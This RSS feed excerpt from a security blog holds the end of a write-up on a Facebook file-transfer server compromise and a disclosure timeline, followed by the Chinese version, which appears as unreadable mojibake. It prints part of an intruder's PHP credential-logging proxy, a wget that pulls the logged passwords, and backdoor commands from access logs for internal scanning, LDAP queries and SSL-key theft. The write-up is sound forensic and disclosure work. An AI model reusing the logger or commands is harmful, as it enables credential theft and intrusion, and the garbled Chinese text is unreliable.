class=&quot;s2&quot;&gt;&amp;quot;REMOTE_ADDR&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;HTTP_USER_AGENT&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;POST=&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;GET=&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;COOKIE=&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;// blah blah blah...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The first few ones were typical PHP one-line backdoor and thereâ€™s one exception: â€œ&lt;strong&gt;sclient_user_class_standard.inc&lt;/strong&gt;â€&lt;/p&gt;

&lt;p&gt;In include_once â€œ&lt;strong&gt;sclient_user_class_standard.inc.orig&lt;/strong&gt;â€ was the original PHP app for password verification, and the hacker created a proxy in between to log GET, POST, COOKIE values while some important operations were under way.&lt;/p&gt;

&lt;p&gt;A brief summary, the hacker created a proxy on the credential page to log the credentials of Facebook employees. These logged passwords were stored under web directory for the hacker to use WGET every once in a while&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://files.fb.com/courier/B3dKe9sQaa0L.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/5.jpg&quot; alt=&quot;logged password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
&lt;em&gt;â†‘ Logged passwords&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;From this info we can see that apart from the logged credentials there were also contents of letters requesting files from FTA, and these logged credentials were rotated regularly (this will be mentioned later, thatâ€™s kinda cheapâ€¦XD)&lt;/p&gt;

&lt;p&gt;And at the time I discovered these, there were around 300 logged credentials dated between February 1st to 7th, from February 1st, mostly â€œ&lt;strong&gt;@fb.com&lt;/strong&gt;â€ and â€œ&lt;strong&gt;@facebook.com&lt;/strong&gt;â€. Upon seeing it I thought itâ€™s a pretty serious security incident. In FTA, there were mainly two modes for user login&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Regular users sign up: their password hash were stored in the database and hashed encrypted with SHA256+SALT&lt;/li&gt;
  &lt;li&gt;All Facebook employees (@fb.com) used LDAP and authenticated by AD Server&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I believe these logged credentials were real passwords and I &lt;strong&gt;GUESS&lt;/strong&gt; they can access to services such as Mail OWA, VPN for advanced penetrationâ€¦&lt;/p&gt;

&lt;p&gt;In addition, this hacker might be careless:P&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;The backdoor parameters were passed through GET method and his footprinting can be identified easily in from web log&lt;/li&gt;
  &lt;li&gt;When the hacker was sending out commands, he didnâ€™t take care of STDERR, and left a lot of command error messages in web log which the hackerâ€™s operations could be seen&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
From access.log, every few days the hacker will clear all the credentials he logged&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-prolog&quot; data-lang=&quot;prolog&quot;&gt;&lt;span class=&quot;mf&quot;&gt;192.168.54.13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17955&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Sat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Jan&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2016&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;s-Atom&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;s-Atom&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0000&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1453575850&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;GET /courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p &amp;#39;********&amp;#39; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &amp;#39;cp /home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo &amp;gt; /home/seos/courier/B3dKe9sQaa0L.log&amp;#39; 2&amp;gt;/dev/stdout HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2559&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Packing files&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cat tmp_list3_2 &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; cp /home/filex2/1000/&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; files&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; 2&amp;gt;/dev/stdout
tar -czvf files.tar.gz files&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Enumerating internal network architecture&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;dig a archibus.thefacebook.com
telnet archibus.facebook.com 80
curl http://archibus.thefacebook.com/spaceview&lt;span class=&quot;nb&quot;&gt;_&lt;/span&gt;facebook/locator/room.php
dig a records.fb.com
telnet records.fb.com 80
telnet records.fb.com 443
wget -O- -q http://192.168.41.16
dig a acme.facebook.com
./sshpass -p &amp;#39;********&amp;#39; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &amp;#39;for i in &lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;201&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;; do for j in &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;(seq 0 1 255); do echo &amp;quot;192.168.&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;i.&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;j:`dig +short ptr &lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;j.&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;i.168.192.in-addr.arpa`&amp;quot;; done; done&amp;#39; 2&amp;gt;/dev/stdout
...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Use ShellScript to scan internal network but forgot to redirect STDERR XD&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20160421/6.jpg&quot; alt=&quot;Port Scanning&quot; /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Attempt to connect internal LDAP server&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;sh: -c: line 0: syntax error near unexpected token `(&amp;#39;
sh: -c: line 0: `ldapsearch -v -x -H ldaps://ldap.thefacebook.com -b CN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w &amp;#39;********&amp;#39; -s base (objectclass=*) 2&amp;gt;/dev/stdout&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Attempt to access internal server   &lt;br /&gt;
(Looked like Mail OWA could be accessed directlyâ€¦)&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;--20:38:09--  https://mail.thefacebook.com/
Resolving mail.thefacebook.com... 192.168.52.37
Connecting to mail.thefacebook.com|192.168.52.37|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://mail.thefacebook.com/owa/ [following]
--20:38:10--  https://mail.thefacebook.com/owa/
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 302 Moved Temporarily
Location: https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0 [following]
--20:38:10--  https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 200 OK
Length: 8902 (8.7K) [text/html]
Saving to: `STDOUT&amp;#39;

     0K ........                                              100% 1.17G=0s

20:38:10 (1.17 GB/s) - `-&amp;#39; saved [8902/8902]

--20:38:33--  (try:15)  https://10.8.151.47/
Connecting to 10.8.151.47:443... --20:38:51--  https://svn.thefacebook.com/
Resolving svn.thefacebook.com... failed: Name or service not known.
--20:39:03--  https://sb-dev.thefacebook.com/
Resolving sb-dev.thefacebook.com... failed: Name or service not known.
failed: Connection timed out.
Retrying.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Attempt to steal SSL Private Key&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
ls: /etc/opt/apache/ssl.key/server.key: No such file or directory
mv: cannot stat `x&amp;#39;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&amp;#39;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&amp;#39;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&amp;#39;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&amp;#39;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
base64: invalid input&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;After checking the browser, the SSL certificate of files.fb.com was *.fb.com â€¦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/7.jpg&quot; alt=&quot;certificate of files.fb.com&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h3&gt;

&lt;p&gt;After adequate proofs had been collected, they were immediately reported to Facebook Security Team. Other than vulnerability details accompanying logs, screenshots and timelines were also submitted xD&lt;/p&gt;

&lt;p&gt;Also, from the log on the server, there were two periods that the system was obviously operated by the hacker, one in the beginning of July and one in mid-September&lt;/p&gt;

&lt;p&gt;the July one seemed to be a server â€œdorkingâ€ and the September one seemed more vicious. Other than server â€œdorkingâ€ keyloggers were also implemented. As for the identities of these two hackers, were they the same person? Your guess is as good as mine. :P  &lt;br /&gt;
The time July incident happened to take place right before the announcement of CVE-2015-2857 exploit. Whether it was an invasion of 1-day exploitation or unknown 0-day ones were left in question.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Hereâ€™s the end of the story, and, generally speaking, it was a rather interesting experience xD  &lt;br /&gt;
Thanks to this event, it inspired me to write some articles about penetration :P&lt;/p&gt;

&lt;p&gt;Last but not least, I would like to thank Bug Bounty and tolerant Facebook Security Team so that I could fully write down this incident : )&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2016/02/05 20:05 Provide vulnerability details to Facebook Security Team&lt;/li&gt;
  &lt;li&gt;2016/02/05 20:08 Receive automatic response&lt;/li&gt;
  &lt;li&gt;2016/02/06 05:21 Submit vulnerability Advisory to Accellion Support Team&lt;/li&gt;
  &lt;li&gt;2016/02/06 07:42 Receive response from Thomas that inspection is in progress&lt;/li&gt;
  &lt;li&gt;2016/02/13 07:43 Receive response from Reginaldo about receiving Bug Bounty award $10000 USD&lt;/li&gt;
  &lt;li&gt;2016/02/13 Asking if there anything I should pay special attention to in blog post ?&lt;/li&gt;
  &lt;li&gt;2016/02/13 Asking Is this vulnerability be classify as a RCE or SQL Injection ?&lt;/li&gt;
  &lt;li&gt;2016/02/18 Receive response from Reginaldo about there is a forensics investigation, Would you be able to hold your blog post until this process is complete?&lt;/li&gt;
  &lt;li&gt;2016/02/24 Receive response from Hai about the bounty will include in March payments cycle.&lt;/li&gt;
  &lt;li&gt;2016/04/20 Receive response from Reginaldo about the forensics investigation is done&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/</link>
                <guid>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver</guid>
                <pubDate>Thu, 21 Apr 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>æ»²é€ Facebook çš„æ€è·¯èˆ‡ç™¼ç¾</title>
                <description>&lt;p&gt;by &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someoneâ€™s Backdoor Script&lt;/a&gt; (English Version)  &lt;br /&gt;
&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/&quot;&gt;æ»²é€ Facebook çš„æ€è·¯èˆ‡ç™¼ç¾&lt;/a&gt; (ä¸­æ–‡ç‰ˆæœ¬)&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;å¯«åœ¨æ•…äº‹ä¹‹å‰&quot;&gt;å¯«åœ¨æ•…äº‹ä¹‹å‰&lt;/h3&gt;

&lt;p&gt;èº«ç‚ºä¸€ä½æ»²é€æ¸¬è©¦äººå“¡ï¼Œæ¯”èµ· Client Side çš„å¼±é»æˆ‘æ›´å–œæ­¡ Server Side çš„æ”»æ“Šï¼Œèƒ½å¤ ç›´æ¥çš„æ§åˆ¶ä¼ºæœå™¨ã€ç²å¾—æ¬Šé™æ“ä½œ SHELL æ‰çˆ½ &amp;lt;(ï¿£ï¸¶ï¿£)&amp;gt;&lt;/p&gt;

&lt;p&gt;ç•¶ç„¶ä¸€æ¬¡å®Œç¾çš„æ»²é€ä»»ä½•å½¢å¼çš„å¼±é»éƒ½ä¸å¯å°è¦·ï¼Œåœ¨å¯¦éš›æ»²é€æ™‚å¶çˆ¾é‚„æ˜¯éœ€è¦äº› Client Side å¼±é»çµ„åˆå¯ä»¥æ›´å®Œç¾çš„æ§åˆ¶ä¼ºæœå™¨ï¼Œä½†æ˜¯åœ¨å°‹æ‰¾å¼±é»æ™‚æˆ‘æœ¬èº«é‚„æ˜¯å…ˆåå‘ä»¥å¯ç›´æ¥é€²å…¥ä¼ºæœå™¨çš„æ–¹å¼ä¾†å»å°‹æ‰¾é¢¨éšªé«˜ã€èƒ½é•·é©…ç›´å…¥çš„å¼±é»ã€‚&lt;/p&gt;

&lt;p&gt;éš¨è‘— Facebook åœ¨ä¸–ç•Œä¸Šè¶Šä¾†è¶Šç«ç´…ã€ç”¨æˆ¶é‡è¶Šä¾†è¶Šå¤šï¼Œä¸€ç›´ä»¥ä¾†éƒ½æœ‰æƒ³è¦å˜—è©¦çœ‹çœ‹çš„æƒ³æ³•ï¼Œæ°å·§ Facebook åœ¨ 2012 å¹´é–‹å§‹æœ‰äº† &lt;a href=&quot;https://www.facebook.com/whitehat/&quot;&gt;Bug Bounty&lt;/a&gt; çé‡‘çµäººçš„æ©Ÿåˆ¶è®“æˆ‘æ›´èºèºæ¬²è©¦ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;ä¸€èˆ¬å¦‚ç”±æ»²é€çš„è§’åº¦ä¾†èªªç¿’æ…£æ€§éƒ½æœƒå¾æ”¶é›†è³‡æ–™ã€åµæŸ¥é–‹å§‹ï¼Œé¦–å…ˆç•Œå®šå‡ºç›®æ¨™åœ¨ç¶²è·¯ä¸Šçš„ â€œç¯„åœâ€ æœ‰å¤šå¤§ï¼Œå§‘ä¸”å¯ä»¥è©•ä¼°ä¸€ä¸‹å¾ä½•è™•æ¯”è¼ƒæœ‰æ©Ÿæœƒä¸‹æ‰‹ã€‚ä¾‹å¦‚:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Google Hacking åˆ°ä»€éº¼è³‡æ–™?&lt;/li&gt;
  &lt;li&gt;ç”¨äº†å¹¾å€‹ B æ®µçš„ IP ? C æ®µçš„ IP ?&lt;/li&gt;
  &lt;li&gt;Whois? Reverse Whois?&lt;/li&gt;
  &lt;li&gt;ç”¨äº†ä»€éº¼åŸŸå? å…§éƒ¨ä½¿ç”¨çš„åŸŸå? æ¥è‘—åšå­åŸŸåçš„çŒœæ¸¬ã€æƒæ&lt;/li&gt;
  &lt;li&gt;å…¬å¸å¹³å¸¸æ„›ç”¨ä»€éº¼æ¨£æŠ€è¡“ã€è¨­å‚™?&lt;/li&gt;
  &lt;li&gt;åœ¨ Github, Pastebin ä¸Šæ˜¯å¦æœ‰æ´©æ¼ä»€éº¼è³‡è¨Š?&lt;/li&gt;
  &lt;li&gt;â€¦etc&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç•¶ç„¶ Bug Bounty ä¸¦ä¸æ˜¯è®“ä½ ç„¡é™åˆ¶çš„æ”»æ“Šï¼Œå°‡æ‰€è’é›†åˆ°çš„ç¯„åœèˆ‡ Bug Bounty æ‰€å…è¨±çš„ç¯„åœåšäº¤é›†å¾Œæ‰æ˜¯ä½ çœŸæ­£å¯ä»¥å»å˜—è©¦çš„ç›®æ¨™ã€‚&lt;/p&gt;

&lt;p&gt;ä¸€èˆ¬ä¾†èªªå¤§å…¬å¸åœ¨æ»²é€ä¸­æ¯”è¼ƒå®¹æ˜“å‡ºç¾çš„å•é¡Œé»é€™è£¡èˆ‰å¹¾å€‹ä¾‹å­ä¾†æ¢è¨&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;å°å¤šæ•¸å¤§å…¬å¸è€Œè¨€ï¼Œâ€&lt;strong&gt;ç¶²è·¯é‚Šç•Œ&lt;/strong&gt;â€ æ˜¯æ¯”è¼ƒé›£é¡§åŠã€å®¹æ˜“å‡ºç¾å•é¡Œçš„ä¸€å¡Šï¼Œç•¶å…¬å¸è¦æ¨¡è¶Šå¤§ï¼ŒåŒæ™‚æ“æœ‰æ•¸åƒã€æ•¸è¬å°æ©Ÿå™¨åœ¨ç·šï¼Œç¶²ç®¡å¾ˆé›£é¡§åŠåˆ°æ¯å°æ©Ÿå™¨ã€‚åœ¨æ”»é˜²è£¡ï¼Œé˜²å®ˆè¦é˜²çš„æ˜¯ä¸€å€‹é¢ï¼Œä½†æ”»æ“Šåªéœ€æ‰¾å€‹ä¸€å€‹é»å°±å¯ä»¥çªç ´ï¼Œæ‰€ä»¥é˜²å®ˆæ–¹ç›¸å°è™•æ–¼å¼±å‹¢ï¼Œæ”»æ“Šè€…åªè¦æ‰¾åˆ°ä¸€å°ä½æ–¼ç¶²è·¯é‚Šç•Œçš„æ©Ÿå™¨å…¥ä¾µé€²å»å°±å¯ä»¥é–‹å§‹åœ¨å…§ç¶²é€²è¡Œæ»²é€äº†!&lt;/li&gt;
  &lt;li&gt;å°æ–¼ â€œ&lt;strong&gt;é€£ç¶²è¨­å‚™&lt;/strong&gt;â€ çš„å®‰å…¨æ„è­˜ç›¸å°è–„å¼±ï¼Œç”±æ–¼é€£ç¶²è¨­å‚™é€šå¸¸ä¸æœƒæä¾› SHELL çµ¦ç®¡ç†å“¡åšé€²ä¸€æ­¥çš„æ“ä½œï¼Œåªèƒ½ç”±è¨­å‚™æœ¬èº«æ‰€æä¾›çš„ä»‹é¢è¨­å®šï¼Œæ‰€ä»¥é€šå¸¸å°æ–¼è¨­å‚™çš„é˜²ç¦¦éƒ½æ˜¯å¾ç¶²è·¯å±¤ä¾†æŠµæ“‹ï¼Œä½†å¦‚é‡åˆ°è¨­å‚™æœ¬èº«çš„ 0-Day æˆ–è€…æ˜¯ 1-Day å¯èƒ½é€£è¢«å…¥ä¾µäº†éƒ½ä¸è‡ªè¦ºã€‚&lt;/li&gt;
  &lt;li&gt;äººçš„å®‰å…¨ï¼Œéš¨è‘— â€œ&lt;strong&gt;ç¤¾å·¥åº«&lt;/strong&gt;â€ çš„å´›èµ·ï¼Œæœ‰æ™‚å¯ä»¥è®“ä¸€æ¬¡æ»²é€çš„æµç¨‹è®Šå¾—ç•°å¸¸ç°¡å–®ï¼Œå¾å…¬é–‹è³‡æ–™æ‰¾å‡ºå…¬å¸å“¡å·¥åˆ—è¡¨ï¼Œå†å¾ç¤¾å·¥åº«æ‰¾åˆ°å¯ä»¥ç™»å…¥ VPN çš„å“¡å·¥å¯†ç¢¼å°±å¯ä»¥é–‹å§‹é€²è¡Œå…§ç¶²æ»²é€ï¼Œå°¤å…¶ç•¶ç¤¾å·¥åº«æ•¸é‡è¶Šä¾†è¶Šå¤š â€œ&lt;strong&gt;é‡è®Šæˆè³ªè®Š&lt;/strong&gt;â€ æ™‚åªè¦é—œéµäººç‰©çš„å¯†ç¢¼åœ¨ç¤¾å·¥åº«ä¸­å¯æ‰¾åˆ°ï¼Œé‚£ä¼æ¥­çš„å®‰å…¨æ€§å°±å…¨ç„¶çªç ´ :P&lt;br /&gt;
&lt;br /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ç†æ‰€ç•¶ç„¶åœ¨å°‹æ‰¾ Facebook å¼±é»æ™‚æœƒä»¥å¹³å¸¸é€²è¡Œæ»²é€çš„æ€è·¯é€²è¡Œï¼Œåœ¨é–‹å§‹æœé›†è³‡æ–™æ™‚é™¤äº†é‡å° Facebook æœ¬èº«åŸŸåæŸ¥è©¢å¤–ä¹Ÿå°è¨»å†Šä¿¡ç®±é€²è¡Œ Reverse Whois æ„å¤–ç™¼ç¾äº†å€‹å¥‡å¦™çš„åŸŸååç¨±&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tfbnw.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;TFBNW ä¼¼ä¹æ˜¯ â€œ&lt;strong&gt;TheFacebook Network&lt;/strong&gt;â€ çš„ç¸®å¯«  &lt;br /&gt;
å†è—‰ç”±å…¬é–‹è³‡æ–™ç™¼ç¾å­˜åœ¨ä¸‹é¢é€™å°é€™å°ä¼ºæœå™¨&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vpn.tfbnw.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å“‡! vpn.tfbnw.net çœ‹èµ·ä¾†æ˜¯å€‹ Juniper SSL VPN çš„ç™»å…¥ä»‹é¢ï¼Œä¸éç‰ˆæœ¬æ»¿æ–°çš„æ²’æœ‰ç›´æ¥å¯åˆ©ç”¨çš„å¼±é»ï¼Œä¸éé€™ä¹Ÿæˆç‚ºäº†é€²å…¥å¾Œé¢æ•…äº‹çš„é–‹ç«¯ã€‚&lt;/p&gt;

&lt;p&gt;TFBNW çœ‹ä¼¼æ˜¯ Facebook å…§éƒ¨ç”¨çš„åŸŸåï¼Œä¾†æƒæƒ vpn.tfbnw.net åŒç¶²æ®µçœ‹æœƒæœ‰ä»€éº¼ç™¼ç¾&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Mail Server Outlook Web App&lt;/li&gt;
  &lt;li&gt;F5 BIGIP SSL VPN&lt;/li&gt;
  &lt;li&gt;CISCO ASA SSL VPN&lt;/li&gt;
  &lt;li&gt;Oracle E-Business&lt;/li&gt;
  &lt;li&gt;MobileIron MDM&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å¾é€™å¹¾å°æ©Ÿå™¨å¤§è‡´å¯ä»¥åˆ¤æ–·é€™å€‹ç¶²æ®µå°æ–¼ Facebook ä¾†èªªæ‡‰è©²æ˜¯ç›¸å°é‡è¦çš„ç¶²æ®µï¼Œä¹‹å¾Œä¸€åˆ‡çš„æ•…äº‹å°±å¾é€™è£¡é–‹å§‹ã€‚&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;å¼±é»ç™¼ç¾&quot;&gt;å¼±é»ç™¼ç¾&lt;/h3&gt;

&lt;p&gt;åœ¨åŒç¶²æ®µä¸­ï¼Œç™¼ç¾ä¸€å°ç‰¹åˆ¥çš„ä¼ºæœå™¨&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;files.fb.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/1.jpg&quot; alt=&quot;files.fb.com&quot; /&gt;&lt;br /&gt;
&lt;em&gt;â†‘ files.fb.com ç™»å…¥ä»‹é¢&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å¾ LOGO ä»¥åŠ Footer åˆ¤æ–·æ‡‰è©²æ˜¯ Accellion çš„ Secure File Transfer (ä»¥ä¸‹ç°¡ç¨± FTA)&lt;/p&gt;

